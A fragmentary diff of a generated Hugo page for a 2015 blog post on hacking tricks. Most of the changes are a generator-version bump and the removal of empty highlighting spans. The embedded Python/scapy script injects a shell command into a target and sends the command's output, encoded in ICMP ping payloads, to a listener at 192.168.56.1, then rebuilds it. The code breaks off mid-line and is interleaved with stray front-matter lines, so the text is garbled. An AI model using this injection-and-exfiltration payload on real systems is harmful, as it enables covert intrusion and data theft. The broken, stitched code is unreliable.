@@ -20,7 +20,7 @@ $ tcpdump -i vboxnet0 -A tcpdump: verbose output suppressed, use -v or -vv for f
 <meta property='og:site_name' content='wrfly&#39;s blog'>
 <meta property='og:type' content='article'><meta property='article:section' content='Posts'><meta property='article:tag' content='code'><meta property='article:published_time' content='2015-12-05T00:00:00Z'/><meta property='article:modified_time' content='2015-12-05T00:00:00Z'/><meta name='twitter:card' content='summary'>
 
-<meta name="generator" content="Hugo 0.31" />
+<meta name="generator" content="Hugo 0.40.1" />
 
   <title>几个hack小技巧 • wrfly&#39;s blog</title>
   <link rel='canonical' href='https://wrfly.kfd.me/posts/%E5%87%A0%E4%B8%AAhack%E5%B0%8F%E6%8A%80%E5%B7%A7/'>
@@ -144,22 +144,22 @@ date: <span style="color:#ae81ff">2015</span><span style="color:#f92672">-</span
 title: <span style="color:#960050;background-color:#1e0010">几个</span>hack小技巧
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pingListen</span>():
-  pkts <span style="color:#f92672">=</span> sniff(iface<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;vboxnet0&#34;</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
+  pkts <span style="color:#f92672">=</span> sniff(iface<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;vboxnet0&#34;</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
 
   <span style="color:#66d9ef">for</span> packet <span style="color:#f92672">in</span> pkts:
     <span style="color:#66d9ef">if</span> packet<span style="color:#f92672">.</span>getlayer(ICMP):
-      <span style="color:#66d9ef">if</span> str(packet<span style="color:#f92672">.</span>getlayer(ICMP)<span style="color:#f92672">.</span>type) <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;8&#34;</span>:
+      <span style="color:#66d9ef">if</span> str(packet<span style="color:#f92672">.</span>getlayer(ICMP)<span style="color:#f92672">.</span>type) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;8&#34;</span>:
         sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(packet<span style="color:#f92672">.</span>getlayer(Raw)<span style="color:#f92672">.</span>load[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
 
 
-<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;__main__&#34;</span>:
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
   <span style="color:#66d9ef">while</span> True:
     <span style="color:#66d9ef">try</span>:
-      sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;# &#39;</span>)
+      sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;# &#39;</span>)
       command <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>readline()<span style="color:#f92672">.</span>strip()
       thread <span style="color:#f92672">=</span> Thread(target<span style="color:#f92672">=</span>pingListen)
       thread<span style="color:#f92672">.</span>start()
-      payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;; TEST=$(</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> 2&gt;&amp;1 | xxd -c 1 -ps); for TEST2 in $TEST; do ping -c 1 -p $TEST2 192.168.56.1; done&#34;</span><span style="color:#f92672">%</span>command
+      payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;; TEST=$(</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> 2&gt;&amp;1 | xxd -c 1 -ps); for TEST2 in $TEST; do ping -c 1 -p $TEST2 192.168.56.1; done&#34;</span><span style="color:#f92672">%</span>command
       r <span style="color:#f92672">=</span> post
 date: <span style="color:#ae81ff">2015</span><span style="color:#f92672">-</span><span style="color:#ae81ff">12</span><span style="color:#f92672">-</span><span style="color:#ae81ff">05</span>
 title: <span style="color:#960050;background-color:#1e0010">几个</span>hack小技巧
